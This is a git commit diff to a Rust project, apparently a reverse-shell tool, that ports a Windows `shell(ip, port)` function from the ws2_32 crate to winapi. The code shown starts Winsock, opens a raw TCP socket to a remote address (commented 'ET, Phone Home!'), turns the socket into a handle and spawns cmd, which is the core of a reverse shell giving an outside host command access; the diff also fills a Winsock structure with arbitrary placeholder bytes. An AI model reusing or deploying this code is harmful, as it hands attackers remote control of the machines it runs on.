616ceaae3b0a96a5b6eec4ba7d41f7d82fdbc753
Avery Wagar <ajmw.subs@gmail.com>
2018-11-14 16:21:09 -0800

    Windows

--- src/windows_shell/mod.rs
+++ src/windows_shell/mod.rs
@@ -11,8 +11,6 @@ use std::*;
 // Windows based imports
 #[cfg(windows)]
 extern crate winapi;
-#[cfg(windows)]
-extern crate ws2_32;
 
 #[cfg(windows)]
 use std::os::windows::io::FromRawHandle;
@@ -20,18 +18,49 @@ use std::os::windows::io::FromRawHandle;
 #[cfg(windows)]
 pub fn shell(ip: String, port: String) {
     // https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx
-    let PF_INET = winapi::shared::winsock2::PF_INET; // Ipv4
+    let PF_INET = winapi::um::winsock2::PF_INET; // Ipv4
     let IPPROTO_TCP = 6; // TCP-Sock Stream
-    let NULL: *mut winapi::winsock2::WSAPROTOCOL_INFOA = ptr::null_mut(); // Setup a null mutable type
-    let version: u16 = 22; // Version 2.2 of winsock
+    let NULL: *mut winapi::um::winsock2::WSAPROTOCOL_INFOA = ptr::null_mut(); // Setup a null mutable type
+    let version =  winapi::um::winsock2::WINSOCK_VERSION; // Version 2.2 of winsock
 
+        // Random shit
+    let mut vendor: i8 = 10; 
+    let vendorPtr: *mut i8 = &mut vendor;
 
     // Mutable data for startup
-    let mut data: winapi::winsock2::WSADATA = winapi::winsock2::WSADATA;
+    let mut data: winapi::um::winsock2::WSADATA = winapi::um::winsock2::WSADATA {
+        iMaxSockets: 1,
+        iMaxUdpDg: 1,
+        szDescription: [
+            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
+            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
+            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
+            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
+            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
+            126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
+            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
+            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
+            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
+            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
+            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 1,
+            1, 1, 1, 1,
+        ],
+        szSystemStatus: [
+            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
+            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
+            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
+            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
+            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
+            126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 1,
+        ],
+        lpVendorInfo: vendorPtr,
+        wHighVersion: version,
+        wVersion: version
+    };
 
     // Start WSA and WinSock2
     unsafe {
-        ws2_32::WSAStartup(winapi::um::winsock2::wVersion, &mut data);
+        winapi::um::winsock2::WSAStartup(version, &mut data);
     }
 
     // ET, Phone Home!
@@ -42,11 +71,12 @@ pub fn shell(ip: String, port: String) {
 
     // Raw Socket for windows
     unsafe {
-        let socket = ws2_32::WSASocketA(PF_INET, 1, IPPROTO_TCP, NULL, 0, 0);
+        let socket = winapi::um::winsock2::WSASocketA(PF_INET, 1, IPPROTO_TCP, NULL, 0, 0);
 
         println!("{}", socket);
 
-        let handle: winapi::winnt::HANDLE = socket as winapi::winnt::HANDLE;
+        let handle: winapi::um::winnt::HANDLE = socket as winapi::um::winnt::HANDLE;
+
 
         // Open shell
         Command::new("cmd")
